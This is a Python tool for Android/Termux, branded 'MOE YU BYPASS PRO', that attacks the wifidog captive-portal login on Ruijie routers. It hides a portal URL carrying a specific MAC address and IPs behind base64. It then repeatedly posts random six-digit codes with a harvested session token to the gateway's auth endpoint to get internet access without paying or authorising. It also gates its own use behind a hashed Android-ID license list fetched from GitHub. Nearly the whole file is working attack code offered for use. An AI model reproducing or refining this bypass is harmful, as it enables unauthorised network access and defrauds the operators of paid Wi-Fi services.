import os
import re
import sys
import uuid
import time
import json
import zlib
import ntplib
import ping3
import base64
import random
import string
import urllib
import hashlib
import asyncio
import aiohttp
import requests
import argparse
import marshal
import subprocess
from datetime import datetime
from urllib.parse import quote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION (Moe Yu's Database) ---
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"

# Colors
w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

def get_hwid():
    """Android System ID ကို တိုက်ရိုက်ဆွဲထုတ်ခြင်း (Fixed ID အတွက် အသေချာဆုံးနည်းလမ်း)"""
    try:
        # Android ID ကို settings command နဲ့ ဆွဲထုတ်ခြင်း
        raw_id = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
        if not raw_id or raw_id == "null":
            # မရခဲ့ရင် Termux Path ကို အခြေခံပြီး ID ထုတ်ခြင်း
            raw_id = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
        return hashlib.md5(raw_id.encode()).hexdigest().upper()
    except:
        return "MOEYU-STABLE-LICENSE-SYSTEM-FIXED"

def clear():
    os.system("clear")

def Line():
    print(f"{y}─" * os.get_terminal_size()[0])

def Logo():
    clear()
    my_id = get_hwid()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
 ░ ▒▓ ▒ ░      ▒ ░ ▒ ░   ░░ ▒░ ░   ██▒▒▒    ██▒▒▒ 
 ░ ░▒ ░        ░  ▒       ░ ░  ░ ▓██ ░▒░  ▓██ ░▒░ 
   ░  ░      ░          ░    ▒ ▒ ░░   ▒ ▒ ░░  
     ░       ░ ░        ░  ░ ░ ░      ░ ░      ░  
{g}
         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    Line()
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    Line()

def check_key():
    my_id = get_hwid()
    Logo()
    print(f"{y}[*] Verifying Secure License...{w}")
    try:
        res = requests.get(KEY_URL, timeout=15)
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    key, exp_str = line.split("|")
                    if key.strip() == my_id:
                        today = datetime.now().date()
                        expiry = datetime.strptime(exp_str.strip(), "%Y-%m-%d").date()
                        if today <= expiry:
                            print(f"{g}[+] License Authorized!{w}")
                            time.sleep(1.5)
                            return True
                        else:
                            print(f"{r}[!] KEY EXPIRED!{w}")
                            sys.exit()
            print(f"{r}[!] UNREGISTERED ID!{w}")
            print(f"{y}[>] Your Fixed ID: {c}{my_id}{w}")
            sys.exit()
    except:
        print(f"{r}[!] Connection Failed!{w}")
        sys.exit()

async def get_session_id(session, session_url, prev_id):
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
    try:
        async with session.get(session_url, headers=headers, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return prev_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try: self.ip = open(".ip", "r").read().strip()
        except: print(f"{r}[!] Run setup first!"); sys.exit()

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession() as session:
            l = 0
            while True:
                if l % 5 == 0: sid = await get_session_id(session, self.session_url, None)
                code = "".join(random.choice(string.digits) for _ in range(6))
                try:
                    async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass Active | Status: {g}{res.status}")
                except: pass
                await asyncio.sleep(1)
                l += 1

def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["internet", "setup"], required=True)
    args = parser.parse_args()
    if args.option == "setup":
        Logo()
        try:
            res = requests.get("http://192.168.0.1", timeout=5).url
            gw = re.search('gw_address=(.*?)&', res).group(1)
            with open(".ip", "w") as f: f.write(gw)
            print(f"{g}[+] Setup Success! ID is now Fixed.{w}")
        except: print(f"{r}[!] Setup Failed.")
    elif args.option == "internet":
        asyncio.run(InternetAccess().execute())

if __name__ == "__main__":
    if check_key():
        try: feature()
        except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
